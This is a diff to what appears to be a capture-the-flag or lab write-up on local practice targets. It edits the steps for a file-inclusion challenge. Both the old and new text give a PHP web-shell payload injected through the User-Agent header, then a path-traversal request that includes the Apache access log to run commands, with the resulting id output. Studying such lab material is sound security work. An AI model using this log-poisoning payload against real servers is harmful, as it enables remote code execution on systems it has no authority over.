@@ -213,9 +213,9 @@
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-        [LEVEL 4]-TARGET: http://localhost:8094
+        [LEVEL 5]-TARGET: http://localhost:8095
 
-    - You should focus on the apache2.conf:
+    - There are sthg in apache2.conf:
         ...
         <Directory "/var/www/html/upload/">
                 AllowOverride None
@@ -238,7 +238,7 @@
                 </FilesMatch>
         ...
 
-     => Nowhere to uplaod file. 
+     => Nowhere to upload file. 
      
      - Let see Dockerfile:
 
@@ -257,21 +257,11 @@
                 </div>
         ...
 
-        => If you realize something, then congrats, this took me 1 day to find out we can execute commands from the access.log
+         => The only thing we can change is User-Agent header by using burp suite: 
 
-         => The only thing we can change without any problem is User-Agent header: 
+            User-Agent: <?php system($_REQUEST[cmd]); ?>    
 
-            GET /?game=fatty-bird-1.html HTTP/1.1
-            Host: localhost:8095
-            User-Agent: <?php system($_REQUEST[cmd]); ?>
-            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-            ...
-
-        =>  root@0b5dc550ba7c:/var/www/html# cat /var/log/apache2/access.log
-            ...
-            172.18.0.1 - ... "GET /?game=fatty-bird-1.html HTTP/1.1" 200 2824 "-" "<?php system($_REQUEST[cmd]); ?>"
-
-    [Final Result: RCE] http://localhost:8095/?game=../../../../var/log/apache2/access.log&cmd=id => ... uid=33(www-data) gid=33(www-data) groups=33(www-data) ...
+        => http://localhost:8095/?game=../../../../var/log/apache2/access.log&cmd=id => BOOM
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
